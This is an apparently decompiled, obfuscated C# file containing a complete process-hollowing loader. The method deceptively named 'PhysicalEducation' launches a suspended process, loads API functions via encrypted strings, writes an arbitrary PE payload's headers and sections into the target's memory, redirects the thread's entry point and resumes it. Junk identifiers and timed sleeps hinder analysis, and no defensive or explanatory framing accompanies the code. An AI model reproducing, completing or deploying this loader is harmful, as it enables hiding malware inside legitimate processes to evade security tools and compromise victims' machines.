using System;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using SmartAssembly.SmartExceptionsCore;

namespace cyber1;

public sealed class PE32
{
	public delegate bool bggggggggggggggg4333333333333335454545(IntPtr wwwwwwwwwwwwwwwwwwwwwfe, ref ffffffffffffffffffsdfsdfdsf dggggggggggggggggggggggggggggggggf);

	public delegate uint FOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR(IntPtr threDSADSAad);

	public delegate long JHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS(IntPtr proce3SADASss, int addrSADASDess);

	public delegate bool FSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I2(IntPtr intptr_0, ref ffffffffffffffffffsdfsdfdsf conDSA3SADtext);

	public delegate bool gggggggggggggggRRRRRRRRRRRRR34545(IntPtr proSDA3Acess, int addreSDSA3ss, byte[] bufDSA3ASfer, int sizSA3ASDASe, out int wriS3A3S3tten);

	public delegate IntPtr hhhhhhhhhhhhhhh344444444444444444444444444444(IntPtr proceSA3ASDASss, int addreSA3AAEss, uint siDSA3ze, uint uint_0, uint proS3A3SAtect);

	public delegate int SADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN3242(IntPtr intptr_0, int adSDA3ASdress, ref int buffeDAS3A3r, int int_0, ref int int_1);

	public struct ffffffffffffffffffsdfsdfdsf
	{
		public uint gsdddddddddddddddsd;

		public uint D0;

		public uint D1;

		public uint D2;

		public uint D3;

		public uint D6;

		public uint D7;

		public Save Save;

		public uint SG;

		public uint SF;

		public uint SE;

		public uint SD;

		public uint Edi;

		public uint Esi;

		public uint ggggggggggggsdg;

		public uint Edx;

		public uint Ecx;

		public uint Eax;

		public uint Ebp;

		public uint Eip;

		public uint SC;

		public uint EFlags;

		public uint Esp;

		public uint SS;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] Registers;
	}

	public struct Save
	{
		public uint Control;

		public uint Status;

		public uint Tag;

		public uint ErrorO;

		public uint ErrorS;

		public uint ggggggg54444O;

		public uint ggggggg54444S;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] RegisterArea;

		public uint State;
	}

	public struct wseeeeeeeeeeeeeegsddddd
	{
		public uint ggggggggggdffffffffffffffffg;

		public uint fsddddddddddddddddddddddd;
	}

	public struct Section_Header
	{
		public byte Name;

		public wseeeeeeeeeeeeeegsddddd gdddddddddddddfgggggggggggggg;

		public uint gdt5rt6565tgfgfgfdgdfgdg;

		public uint Size;

		public uint Pointer;

		public uint PRelocations;

		public uint PLines;

		public uint NRelocations;

		public uint NLines;

		public uint fdsssssssssssssssss;
	}

	public struct Process_Information
	{
		public IntPtr hgfhty6ytrBFGHGFGDFG;

		public IntPtr sfffffffgsdg;

		public int ProcessId;

		public int ThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Startup_Information
	{
		public int CB;

		public string ReservedA;

		public string Desktop;

		public string Title;

		public int X;

		public int Y;

		public int XSize;

		public int YSize;

		public int XCount;

		public int YCount;

		public int Fill;

		public int Flags;

		public short ShowWindow;

		public short ReservedB;

		public int ReservedC;

		public int Input;

		public int Output;

		public int Error;
	}

	public struct Security_Flags
	{
		public int Length;

		public IntPtr Descriptor;

		public int Inherit;
	}

	public struct DOS_Header
	{
		public ushort wwwwwwwwwwwww344444444444444;

		public ushort Last;

		public ushort Pages;

		public ushort Relocations;

		public ushort Size;

		public ushort Minimum;

		public ushort Maximum;

		public ushort SS;

		public ushort SP;

		public ushort Checksum;

		public ushort IP;

		public ushort CS;

		public ushort Table;

		public ushort Overlay;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ReservedA;

		public ushort ID;

		public ushort Info;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ReservedB;

		public int Address;
	}

	public struct NT_Headers
	{
		public uint fffffffffff322222222;

		public File_Header File;

		public Optional_Headers Optional;
	}

	public struct File_Header
	{
		public ushort Machine;

		public ushort Sections;

		public uint Stamp;

		public uint Table;

		public uint Symbols;

		public ushort Size;

		public ushort Flags;
	}

	public struct Optional_Headers
	{
		public ushort Magic;

		public byte Major;

		public byte Minor;

		public uint SCode;

		public uint Iggggggg54444;

		public uint Uggggggg54444;

		public uint Address;

		public uint Code;

		public uint ggggggg54444;

		public uint Image;

		public uint SectionA;

		public uint FileA;

		public ushort MajorO;

		public ushort MinorO;

		public ushort MajorI;

		public ushort MinorI;

		public ushort MajorS;

		public ushort MinorS;

		public uint Version;

		public uint SImage;

		public uint SHeaders;

		public uint Checksum;

		public ushort Subsystem;

		public ushort Flags;

		public uint uint_0;

		public uint SSCommit;

		public uint uint_1;

		public uint SHCommit;

		public uint LFlags;

		public uint Count;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public ggggggg54444_Directory[] ggggggg54444Directory;
	}

	public struct ggggggg54444_Directory
	{
		public uint Address;

		public uint Size;
	}

	[NonSerialized]
	internal static GetString getString_0;

	static PE32()
	{
		Strings.CreateGetStringDelegate(typeof(PE32));
	}

	public PE32()
	{
		try
		{
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException1(exception_, this);
			throw;
		}
	}

	private static T gggggggggggggg344444444444444444455555<T>(string string_0, string string_1)
	{
		try
		{
			return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
		}
		catch (Exception exception_)
		{
			T val = default(T);
			StackFrameHelper.CreateException3(exception_, val, string_0, string_1);
			throw;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ghsssssssssSFFFFFFFFFFF);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr GSEEEEEEEEEEEEEE, [MarshalAs(UnmanagedType.VBByRefStr)] ref string GGGGGGGGGGESSSSSSSSSSGSD);

	public static void PhysicalEducation(byte[] byte_0, string string_0)
	{
		GCHandle gCHandle = default(GCHandle);
		ffffffffffffffffffsdfsdfdsf conDSA3SADtext = default(ffffffffffffffffffsdfsdfdsf);
		Process_Information info = default(Process_Information);
		Startup_Information startup = default(Startup_Information);
		Security_Flags process = default(Security_Flags);
		Security_Flags thread = default(Security_Flags);
		DOS_Header dOS_Header = default(DOS_Header);
		IntPtr intPtr = default(IntPtr);
		int num = default(int);
		DOS_Header dOS_Header2 = default(DOS_Header);
		NT_Headers nT_Headers = default(NT_Headers);
		string name = default(string);
		string current = default(string);
		IntPtr intPtr2 = default(IntPtr);
		NT_Headers nT_Headers2 = default(NT_Headers);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		FSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I2 fSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I = default(FSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I2);
		JHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS jHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS = default(JHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS);
		string text14 = default(string);
		bggggggggggggggg4333333333333335454545 bggggggggggggggg4333333333333335454545 = default(bggggggggggggggg4333333333333335454545);
		gggggggggggggggRRRRRRRRRRRRR34545 gggggggggggggggRRRRRRRRRRRRR = default(gggggggggggggggRRRRRRRRRRRRR34545);
		FOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR fOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR = default(FOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR);
		SADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN3242 sADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN = default(SADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN3242);
		hhhhhhhhhhhhhhh344444444444444444444444444444 hhhhhhhhhhhhhhh344444444444444444444444444444 = default(hhhhhhhhhhhhhhh344444444444444444444444444444);
		int buffeDAS3A3r = default(int);
		int int_ = default(int);
		uint num3 = default(uint);
		byte[] bytes = default(byte[]);
		uint num4 = default(uint);
		long num5 = default(long);
		int num6 = default(int);
		int i = default(int);
		string text15 = default(string);
		Section_Header section_Header = default(Section_Header);
		Section_Header section_Header2 = default(Section_Header);
		string text16 = default(string);
		byte[] array = default(byte[]);
		int num7 = default(int);
		int j = default(int);
		string text17 = default(string);
		string text18 = default(string);
		int num8 = default(int);
		string text19 = default(string);
		try
		{
			gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
			conDSA3SADtext = default(ffffffffffffffffffsdfsdfdsf);
			info = default(Process_Information);
			startup = default(Startup_Information);
			process = default(Security_Flags);
			thread = default(Security_Flags);
			dOS_Header = default(DOS_Header);
			intPtr = gCHandle.AddrOfPinnedObject();
			num = intPtr.ToInt32();
			object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), dOS_Header.GetType());
			dOS_Header = ((obj != null) ? ((DOS_Header)obj) : dOS_Header2);
			nT_Headers = default(NT_Headers);
			name = null;
			current = null;
			if (0 - (CreateProcess(ref name, ref string_0, ref process, ref thread, inherit: false, 4u, intPtr2, ref current, ref startup, out info) ? 1 : 0) == 0)
			{
				return;
			}
			gCHandle.Free();
			intPtr = new IntPtr(checked(num + dOS_Header.Address));
			object? obj2 = Marshal.PtrToStructure(intPtr, nT_Headers.GetType());
			nT_Headers = ((obj2 != null) ? ((NT_Headers)obj2) : nT_Headers2);
			startup.CB = Strings.Len((object)startup);
			conDSA3SADtext.gsdddddddddddddddsd = 65538u;
			text = getString_0(6346);
			Conversion.Int((object)false);
			text2 = getString_0(6351);
			Conversion.Int((object)false);
			text3 = getString_0(6376);
			Conversion.Int((object)false);
			text4 = getString_0(6385);
			Conversion.Int((object)false);
			text5 = getString_0(6414);
			Conversion.Int((object)false);
			text6 = getString_0(6419);
			Conversion.Int((object)false);
			text7 = getString_0(6428);
			text8 = getString_0(6437);
			Conversion.Int((object)false);
			text9 = getString_0(6462);
			Conversion.Int((object)false);
			text10 = getString_0(6475);
			Conversion.Int((object)false);
			text11 = getString_0(6480);
			Conversion.Int((object)false);
			text12 = getString_0(6485);
			text13 = getString_0(6502);
			Conversion.Int((object)false);
			fSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I = gggggggggggggg344444444444444444455555<FSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I2>(text + text3, text2);
			jHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS = gggggggggggggg344444444444444444455555<JHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS>(getString_0(6515), text4);
			text14 = getString_0(6524);
			bggggggggggggggg4333333333333335454545 = gggggggggggggg344444444444444444455555<bggggggggggggggg4333333333333335454545>(text + text3, text6 + text9 + text5);
			gggggggggggggggRRRRRRRRRRRRR = gggggggggggggg344444444444444444455555<gggggggggggggggRRRRRRRRRRRRR34545>(text + text3, text10 + text14);
			fOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR = gggggggggggggg344444444444444444455555<FOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR>(text + text3, text12);
			sADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN = gggggggggggggg344444444444444444455555<SADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN3242>(text + text3, text8);
			hhhhhhhhhhhhhhh344444444444444444444444444444 = gggggggggggggg344444444444444444455555<hhhhhhhhhhhhhhh344444444444444444444444444444>(text + text3, text11 + text13 + text7);
			if ((long)nT_Headers.fffffffffff322222222 != 17744L || dOS_Header.wwwwwwwwwwwww344444444444444 != 23117)
			{
				return;
			}
			bool num2 = fSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I(info.sfffffffgsdg, ref conDSA3SADtext);
			SADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN3242 sADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN2 = sADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN;
			IntPtr hgfhty6ytrBFGHGFGDFG = info.hgfhty6ytrBFGHGFGDFG;
			checked
			{
				int adSDA3ASdress = (int)(unchecked((long)conDSA3SADtext.ggggggggggggsdg) + 8L);
				buffeDAS3A3r = 239293923;
				int_ = 0;
				if (!(num2 & (sADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN2(hgfhty6ytrBFGHGFGDFG, adSDA3ASdress, ref buffeDAS3A3r, 4, ref int_) >= 0) & (jHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS(info.hgfhty6ytrBFGHGFGDFG, 239293923) >= 0L)))
				{
					return;
				}
				num3 = (uint)(int)hhhhhhhhhhhhhhh344444444444444444444444444444(info.hgfhty6ytrBFGHGFGDFG, (int)nT_Headers.Optional.Image, nT_Headers.Optional.SImage, 12288u, 4u);
				if (unchecked((long)num3) == 0L)
				{
					return;
				}
				bytes = BitConverter.GetBytes(num3);
				gggggggggggggggRRRRRRRRRRRRR34545 gggggggggggggggRRRRRRRRRRRRR2 = gggggggggggggggRRRRRRRRRRRRR;
				IntPtr hgfhty6ytrBFGHGFGDFG2 = info.hgfhty6ytrBFGHGFGDFG;
				int addreSDSA3ss = (int)num3;
				int sizSA3ASDASe = (int)nT_Headers.Optional.SHeaders;
				int_ = (int)num4;
				gggggggggggggggRRRRRRRRRRRRR2(hgfhty6ytrBFGHGFGDFG2, addreSDSA3ss, byte_0, sizSA3ASDASe, out int_);
				num4 = (uint)int_;
				num5 = dOS_Header.Address + 248;
				num6 = unchecked((int)nT_Headers.File.Sections) - 1;
				for (i = 0; i <= num6; i++)
				{
					text15 = getString_0(6549);
					Conversion.Int((object)false);
					intPtr = new IntPtr(num + num5 + i * 40);
					object? obj3 = Marshal.PtrToStructure(intPtr, section_Header.GetType());
					section_Header = ((obj3 != null) ? ((Section_Header)obj3) : section_Header2);
					Conversion.Int((object)false);
					text16 = getString_0(6549);
					array = new byte[(int)section_Header.Size + 1];
					num7 = (int)(unchecked((long)section_Header.Size) - 1L);
					for (j = 0; j <= num7; j++)
					{
						array[j] = byte_0[(int)(unchecked((long)section_Header.Pointer) + unchecked((long)j))];
					}
					gggggggggggggggRRRRRRRRRRRRR34545 gggggggggggggggRRRRRRRRRRRRR3 = gggggggggggggggRRRRRRRRRRRRR;
					IntPtr hgfhty6ytrBFGHGFGDFG3 = info.hgfhty6ytrBFGHGFGDFG;
					int addreSDSA3ss2 = (int)(num3 + section_Header.gdt5rt6565tgfgfgfdgdfgdg);
					byte[] bufDSA3ASfer = array;
					int sizSA3ASDASe2 = (int)section_Header.Size;
					int_ = (int)num4;
					gggggggggggggggRRRRRRRRRRRRR3(hgfhty6ytrBFGHGFGDFG3, addreSDSA3ss2, bufDSA3ASfer, sizSA3ASDASe2, out int_);
					num4 = (uint)int_;
					hhhhhhhhhhhhhhh344444444444444444444444444444(info.hgfhty6ytrBFGHGFGDFG, (int)(num3 + section_Header.gdt5rt6565tgfgfgfdgdfgdg), section_Header.gdddddddddddddfgggggggggggggg.fsddddddddddddddddddddddd, (uint)fsdddddddddddddddddd(section_Header.fdsssssssssssssssss), 239293923u);
					text17 = getString_0(6562);
				}
				gggggggggggggggRRRRRRRRRRRRR34545 gggggggggggggggRRRRRRRRRRRRR4 = gggggggggggggggRRRRRRRRRRRRR;
				IntPtr hgfhty6ytrBFGHGFGDFG4 = info.hgfhty6ytrBFGHGFGDFG;
				int addreSDSA3ss3 = (int)(unchecked((long)conDSA3SADtext.ggggggggggggsdg) + 8L);
				byte[] bufDSA3ASfer2 = bytes;
				int_ = (int)num4;
				gggggggggggggggRRRRRRRRRRRRR4(hgfhty6ytrBFGHGFGDFG4, addreSDSA3ss3, bufDSA3ASfer2, 4, out int_);
				num4 = (uint)int_;
				conDSA3SADtext.Eax = num3 + nT_Headers.Optional.Address;
				text18 = getString_0(6583);
				Conversion.Int((object)false);
				Thread.Sleep(13021);
				num8 = 323;
				Conversion.Int((object)false);
				text19 = getString_0(6608);
				bggggggggggggggg4333333333333335454545(info.sfffffffgsdg, ref conDSA3SADtext);
				Thread.Sleep(10001);
				fOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR(info.sfffffffgsdg);
			}
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateExceptionN(exception_, new object[57]
			{
				text4, text12, fSDHFOISDJJNRIJNEIORNMIOENWOINROIWENFKSDNMFKn43oin4oi3noINOIANO4I, num, conDSA3SADtext, jHBFSAKUFNASOIUFNASOINFOIASNOINoin43oinoiNMOINFOIANOIFASFAS, dOS_Header, text7, section_Header, info,
				text9, hhhhhhhhhhhhhhh344444444444444444444444444444, text13, gCHandle, text6, text10, text14, text5, bggggggggggggggg4333333333333335454545, gggggggggggggggRRRRRRRRRRRRR,
				text, text3, nT_Headers, num5, text2, text8, process, num4, fOSANHFOIUASNFOIUASHNFOIUASJNDOIJoijoi4jn3io5n32oi5nOINFOIASNFISAASR, sADJEKFKHSALIFHJihjnfoiuasnhj4roiq2noiNIONSAOI4NOI23JN,
				startup, thread, text11, num3, num8, text19, text18, bytes, text17, i,
				text15, text16, array, j, intPtr, dOS_Header2, name, intPtr2, current, nT_Headers2,
				buffeDAS3A3r, int_, num6, section_Header2, num7, byte_0, string_0
			});
			throw;
		}
	}

	private static long RShift(long long_0, long long_1)
	{
		long num = default(long);
		try
		{
			num = checked((long)Math.Round(vbLongToULong(long_0) / Math.Pow(2.0, long_1)));
			return num;
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException3(exception_, num, long_0, long_1);
			throw;
		}
	}

	private static double vbLongToULong(long long_0)
	{
		double num = default(double);
		try
		{
			if (long_0 < 0L)
			{
				num = (double)long_0 + 4294967296.0;
				return num;
			}
			num = long_0;
			return num;
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException2(exception_, num, long_0);
			throw;
		}
	}

	private static long fsdddddddddddddddddd(long long_0)
	{
		object[] array = default(object[]);
		object[] array2 = default(object[]);
		long num = default(long);
		try
		{
			array = new object[8] { 69419572L, 69419572L, 591541283u, 69419572L, 3293748L, 407092L, 3293748L, 407092L };
			array2 = array;
			num = Conversions.ToLong(array2[checked((int)RShift(long_0, 29L))]);
			return num;
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException4(exception_, num, array2, array, long_0);
			throw;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CreateProcess([MarshalAs(UnmanagedType.VBByRefStr)] ref string name, [MarshalAs(UnmanagedType.VBByRefStr)] ref string command, ref Security_Flags process, ref Security_Flags thread, bool inherit, uint flags, IntPtr system, [MarshalAs(UnmanagedType.VBByRefStr)] ref string current, [In] ref Startup_Information startup, out Process_Information info);
}
